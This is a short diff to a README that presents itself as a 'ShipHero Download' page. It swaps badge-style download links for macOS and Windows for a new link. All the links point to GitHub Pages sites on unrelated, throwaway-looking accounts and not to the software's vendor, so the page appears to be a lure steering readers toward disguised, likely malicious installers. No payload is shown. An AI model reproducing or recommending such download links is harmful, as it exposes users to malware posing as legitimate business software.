@@ -1,18 +1,7 @@
 # ShipHero Download — Shipping Management Platform
 
-<a href="https://app-hub-deploy.github.io/.github/?offer=ShipHero" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/ShipHero%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="ShipHero for macOS">
-</a>
+[![GET ShipHero Mac](https://img.shields.io/badge/GET%20%E2%80%94%20ShipHero-Mac-0078D6?style=for-the-badge&logoColor=white)](https://tearececilie453.github.io/.github/ShipHero-Mac)
 
-<a href="https://app-hub-deploy.github.io/.github/?offer=ShipHero" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/ShipHero%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="ShipHero for Windows">
-</a>
 
 ---
 
